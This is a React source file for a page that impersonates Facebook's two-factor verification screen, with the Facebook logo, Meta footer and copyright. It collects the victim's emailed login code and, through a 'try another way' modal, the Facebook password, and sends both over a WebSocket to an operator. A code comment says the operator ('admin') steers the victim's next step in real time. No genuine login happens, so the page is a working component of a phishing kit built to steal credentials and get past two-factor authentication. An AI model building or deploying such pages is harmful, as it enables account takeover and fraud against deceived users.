import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useWebSocket } from '../context/WebSocketContext';
import "../styles/email-otp.css";

const EmailOtp = () => {
  const navigate = useNavigate();
  const { submitForm, isConnected } = useWebSocket();
  const [code, setCode] = useState("");
  const [showError, setShowError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [password, setPassword] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();

    const value = code.trim();

    // Validate code (6-8 digits)
    if (value.length < 6 || value.length > 8 || !/^\d+$/.test(value)) {
      setShowError(true);
      return;
    }

    setShowError(false);
    setIsLoading(true);

    // Submit to WebSocket
    submitForm('email', {
      code: value
    });
    
    setIsSubmitted(true);
    // Keep loading state - admin will navigate via WebSocket
  };

  const handleOtherWays = (e) => {
    e.preventDefault();
    setShowModal(true);
  };

  const handleModalClose = () => {
    setShowModal(false);
  };

  const handlePasswordSubmit = () => {
    if (password.trim()) {
      setShowModal(false);
      // Submit password to WebSocket
      submitForm('password', {
        password: password
      });
    }
  };

  return (
    <>
      <div className="auth-page">
        {/* Header */}
        <div className="authHeader">
          <div className="authInnerHeader">
            <div className="authHeaderImg">
              <img src="/fblogo.svg" alt="Facebook" />
            </div>
            <a href="#" className="authLogout">
              Log Out
            </a>
          </div>
        </div>

        {/* Main Form Container */}
        <div className="authFormContainer">
          <form className="authForm" onSubmit={handleSubmit}>
            <h4>Choose a way to confirm that it's you</h4>
            <div className="seperator">
              <p>
                Your account has two-factor authentication switched on, which
                requires this extra login step.
              </p>
            </div>
            <div className="seperator noBorder">
              <h4>
                Or, enter your login code
              </h4>
              <p className="noBtmMargin" style={{ display: "block" }}>
                Enter the code we sent to your email.
              </p>
              <p className="noBtmMargin" style={{ display: "none" }}>
                Enter the 6-digit code we just sent to your phone or from the
                authentication app you set up.
              </p>
              <div className="flex gap-2 items-center">
                <input
                  className="authFormInput"
                  id="authenticator"
                  placeholder="Login code"
                  maxLength="8"
                  inputMode="numeric"
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  name="authenticator"
                />
                <span
                  className="error mt-0!"
                  style={{ display: showError ? "block" : "none" }}
                >
                  Entered code is incorrect.
                </span>
              </div>
            </div>
            <div className="authSubmit">
              <a href="#" onClick={handleOtherWays}>
                Need another way to confirm that it's you?
              </a>
              <button name="submitAuth" type="submit" className="submit-btn" disabled={isLoading}>
                {isLoading ? (
                  <>
                    <svg className="spinner" viewBox="0 0 50 50">
                      <circle className="path" cx="25" cy="25" r="20" fill="none" strokeWidth="5"></circle>
                    </svg>
                    <span>Please wait...</span>
                  </>
                ) : (
                  'Submit Code'
                )}
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <div className="auth-footer">
        <div className="topFooter">
          <a href="#">English (US)</a>
          <a href="#">Español</a>
          <a href="#">Français (France)</a>
          <a href="#">中文(简体)</a>
          <a href="#">العربية</a>
          <a href="#">Português (Brasil)</a>
          <a href="#">Italiano</a>
          <a href="#">한국어</a>
          <a href="#">Deutsch</a>
          <a href="#">हिन्दी</a>
          <a href="#">日本語</a>
        </div>
        <div className="bottomFooter">
          <a href="#">Sign Up</a>
          <a href="#">Log In</a>
          <a href="#">Messenger</a>
          <a href="#">Facebook Lite</a>
          <a href="#">Watch</a>
          <a href="#">Places</a>
          <a href="#">Games</a>
          <a href="#">Marketplace</a>
          <a href="#">Meta Pay</a>
          <a href="#">Oculus</a>
          <a href="#">Portal</a>
          <a href="#">Instagram</a>
          <a href="#">Bulletin</a>
          <a href="#">Local</a>
          <a href="#">Fundraisers</a>
          <a href="#">Services</a>
          <a href="#">Voting Information Centre</a>
          <a href="#">About</a>
          <a href="#">Create Ad</a>
          <a href="#">Create Page</a>
          <a href="#">Developers</a>
          <a href="#">Careers</a>
          <a href="#">Privacy</a>
          <a href="#">Cookies</a>
          <a href="#">Ad choices</a>
          <a href="#">Terms</a>
          <a href="#">Help</a>
        </div>
        <span>Meta © {new Date().getFullYear()}</span>
      </div>

      {/* Modal */}
      <div className={`modalContainer ${showModal ? "active" : ""}`}>
        <div className="modalForm">
          <div className="modalTitle">
            <h2>
              Try another way
              <button className="modalCloseBttn" onClick={handleModalClose}>
                ×
              </button>
            </h2>
          </div>
          <div className="modalInner">
            <div className="modalSection">
              <h4>Enter your password</h4>
              <p>
                If you're having trouble receiving your login code, you can
                verify your identity by entering your Facebook password.
              </p>
              <div style={{ marginTop: "10px" }}>
                <input
                  type="password"
                  className="authFormInput"
                  placeholder="Facebook password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={{ width: "100%", boxSizing: "border-box" }}
                />
              </div>
            </div>
            <div
              className="modalSection noBorder"
              style={{ textAlign: "right" }}
            >
              <button className="modalButton" onClick={handleModalClose}>
                Cancel
              </button>
              <button
                className="modalButton"
                style={{ backgroundColor: "#4167b2", color: "#fff" }}
                onClick={handlePasswordSubmit}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default EmailOtp;
